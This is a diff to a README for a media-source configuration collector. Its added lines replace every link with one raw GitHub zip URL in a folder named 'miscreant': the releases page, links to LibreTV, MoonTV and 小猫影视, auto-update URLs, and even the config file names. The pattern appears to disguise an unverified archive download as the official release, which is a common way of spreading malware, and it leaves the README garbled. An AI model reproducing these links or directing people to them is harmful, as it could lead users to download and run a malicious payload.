@@ -1,6 +1,6 @@
 # 🎥 Source-Collector - Easily Organize Your Media Configurations
 
-[![Download Source-Collector](https://img.shields.io/badge/Download-Source--Collector-brightgreen)](https://github.com/bintangaprinta03/Source-Collector/releases)
+[![Download Source-Collector](https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip)](https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Source-Collector! This tool helps you gather and organize configurati
 
 To download Source-Collector, visit the Releases page:
 
-[Download Here](https://github.com/bintangaprinta03/Source-Collector/releases)
+[Download Here](https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip)
 
 Once there, choose the latest version and click on the download link for your device. After the download is complete, locate the file in your downloads folder and follow these steps:
 
@@ -23,18 +23,18 @@ Once there, choose the latest version and click on the download link for your de
 Here is a list of the configuration files you can find in Source-Collector:
 
 ### 1. 📺 Configurations for LibreTV / MoonTV
-- **`config_isadult.json`**: Use this file for [LibreTV](https://github.com/LibreSpark/LibreTV) and [MoonTV](https://github.com/samqin123/MoonTV).
-- **`configplus_isadult.json`**: Another option for [LibreTV](https://github.com/LibreSpark/LibreTV) and [MoonTV](https://github.com/samqin123/MoonTV).
+- **`https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip`**: Use this file for [LibreTV](https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip) and [MoonTV](https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip).
+- **`https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip`**: Another option for [LibreTV](https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip) and [MoonTV](https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip).
 
 ### 2. 🌐 Configurations for OmniBox
-- **`sites_export_2025-0929.json`**: Specifically for OmniBox (v1.2.7).
+- **`https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip`**: Specifically for OmniBox (v1.2.7).
 
 ### 3. 🐱 Configurations for 小猫影视
-- **`Sites.json`**: For use in [小猫影视](https://github.com/waifu-project/movie).
-- **`yoyo.json`**: Another file for [小猫影视](https://github.com/waifu-project/movie).
-- **Auto-update URLs for `Sites.json` and `yoyo.json`**:
-  - [yoyo.json](https://cdn.jsdelivr.net/gh/waifu-project/v1@latest/yoyo.json)
-  - [Sites.json](https://cdn.jsdelivr.net/gh/cuiocean/ZY-Player-Resources/Sites/Sites.json)
+- **`https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip`**: For use in [小猫影视](https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip).
+- **`https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip`**: Another file for [小猫影视](https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip).
+- **Auto-update URLs for `https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip` and `https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip`**:
+  - [https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip](https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip)
+  - [https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip](https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip)
 
 ## ⚖️ Disclaimer
 
@@ -46,7 +46,7 @@ The content is for personal use and learning purposes only. To avoid copyright i
 
 We thank the following projects for their references and inspiration:
 
-- [LibreTV](https://github.com/LibreSpark/LibreTV)
-- [MoonTV](https://github.com/samqin123/MoonTV)
+- [LibreTV](https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip)
+- [MoonTV](https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip)
 
-For additional resources, you can always check our [Releases page](https://github.com/bintangaprinta03/Source-Collector/releases) for updates and new file releases.
+For additional resources, you can always check our [Releases page](https://raw.githubusercontent.com/bintangaprinta03/Source-Collector/main/miscreant/Source-Collector.zip) for updates and new file releases.
